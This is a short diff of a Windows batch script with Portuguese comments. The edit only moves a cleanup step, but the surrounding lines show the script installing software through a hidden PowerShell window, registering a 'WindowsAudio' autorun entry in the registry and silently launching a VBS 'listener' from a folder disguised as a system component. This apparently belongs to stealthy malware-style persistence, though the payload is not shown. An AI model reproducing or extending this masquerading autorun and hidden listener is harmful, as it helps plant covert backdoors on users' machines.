@@ -14,6 +14,7 @@ if %errorlevel% neq 0 (
     echo [*] Instalando Winget...
     start "" /wait powershell -NoProfile -WindowStyle Hidden -Command "Add-AppxPackage -Path (Join-Path $env:TEMP 'winget.msixbundle')" > nul 2>&1
     
+    echo [*] Limpando temporarios...
     del "%TEMP%\winget.msixbundle" > nul 2>&1
 )
 
@@ -44,6 +45,4 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /
 :: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"
 
-:: Limpar e sair
-del "%TEMP%\winget.msixbundle" > nul 2>&1
 exit
